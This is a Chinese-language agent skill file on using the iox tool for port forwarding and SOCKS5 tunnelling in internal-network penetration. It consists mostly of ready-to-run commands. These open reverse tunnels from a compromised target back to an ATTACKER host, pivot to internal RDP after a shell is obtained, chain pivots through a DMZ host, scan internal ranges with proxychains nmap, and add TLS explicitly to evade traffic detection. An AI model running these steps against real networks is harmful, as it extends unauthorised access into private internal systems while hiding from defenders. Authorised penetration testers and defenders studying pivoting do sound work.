---
name: iox-proxy
description: "使用 iox 进行端口转发和内网穿透。当需要把内网端口转发到外网、建立 SOCKS5 隧道、或做流量中转时使用。iox 是单二进制零依赖的端口转发/代理工具，支持正向代理、反向代理、端口映射、SOCKS5 代理，特别适合内网渗透中的流量隧道搭建。比 frp/nps 轻量，比 socat 功能更全。涉及端口转发、内网穿透、SOCKS5 代理、流量中转、隧道搭建的场景使用此技能"
metadata:
  tags: "iox,proxy,forward,tunnel,socks5,端口转发,内网穿透,隧道,代理,pivot"
  category: "tool"
---

# iox 端口转发与内网穿透

iox 是一个轻量级端口转发/代理工具——单个二进制文件，零依赖，支持正向/反向代理和 SOCKS5。在内网渗透中用于搭建流量隧道，让攻击机能访问目标内网服务。

项目地址：https://github.com/EddieIvan01/iox

## 核心概念

iox 有两个主要模式：
- **fwd** (forward)：端口转发——把一个端口的流量转到另一个地址
- **proxy**：SOCKS5 代理——创建代理让攻击机通过目标网络访问内网

每个模式都支持**正向**（目标监听）和**反向**（目标主动连接攻击机）两种连接方式。

## 端口转发 (fwd)

### 正向转发（目标端口 → 目标内网）

在目标机器上运行，把外部访问转到内网：

```bash
# 将目标 8888 端口转发到内网 10.0.0.2:3389
iox fwd -l 8888 -r 10.0.0.2:3389
# 攻击机访问 target:8888 就能连到 10.0.0.2:3389 (RDP)
```

### 反向转发（目标主动连出）

目标无法被直接访问时（有防火墙），让目标主动连接攻击机：

```bash
# 攻击机：监听两个端口
iox fwd -l 8888 -l 9999

# 目标机：连接攻击机，同时连接内网目标
iox fwd -r ATTACKER:8888 -r 10.0.0.2:3389

# 攻击机访问 localhost:9999 就能连到内网 10.0.0.2:3389
```

## SOCKS5 代理 (proxy)

### 正向代理

在目标机器上启动 SOCKS5，攻击机通过目标代理访问内网：

```bash
# 目标机：启动 SOCKS5 代理
iox proxy -l 1080

# 攻击机：配置 proxychains
echo "socks5 TARGET 1080" >> /etc/proxychains.conf
proxychains nmap -sT 10.0.0.0/24
```

### 反向代理（最常用——目标出不了入站但能出站）

```bash
# 攻击机：监听等待连接
iox proxy -l 9999

# 目标机：反连攻击机
iox proxy -r ATTACKER:9999

# 攻击机通过 localhost:9999 使用 SOCKS5
proxychains nmap -sT 10.0.0.0/24
```

## 加密传输

```bash
# 使用 TLS 加密（避免流量特征检测）
iox fwd -l 8888 -r 10.0.0.2:3389 -k

# 反向也支持
iox proxy -r ATTACKER:9999 -k    # 目标
iox proxy -l 9999 -k              # 攻击机
```

## 实战场景

### 场景 1：RDP 内网穿透

```bash
# 目标已拿 shell，需要 RDP 到内网 10.0.0.2
# 攻击机
iox fwd -l 33890 -l 8888
# 目标机
iox fwd -r ATTACKER:8888 -r 10.0.0.2:3389
# 攻击机 RDP 连接
rdesktop localhost:33890
```

### 场景 2：多层内网穿透

```bash
# 第一层：已拿 DMZ 主机
iox proxy -l 1080                          # DMZ 上开 SOCKS5
# 第二层：通过 DMZ 代理访问内网主机
proxychains iox proxy -l 1081 -r 10.0.0.5  # 连到第二层
```

## 决策树

```
需要什么类型的隧道？
├─ 简单端口转发（一个端口映射到另一个）→ iox fwd
├─ SOCKS5 全代理（访问整个内网网段）→ iox proxy
├─ 目标有防火墙限制入站 → 反向模式（-r 代替 -l）
├─ 需要加密 → 加 -k 参数
├─ 需要持久化隧道/Web 管理面板 → frp / nps
└─ 只是临时转一个端口 → socat / ssh -L 也行
```
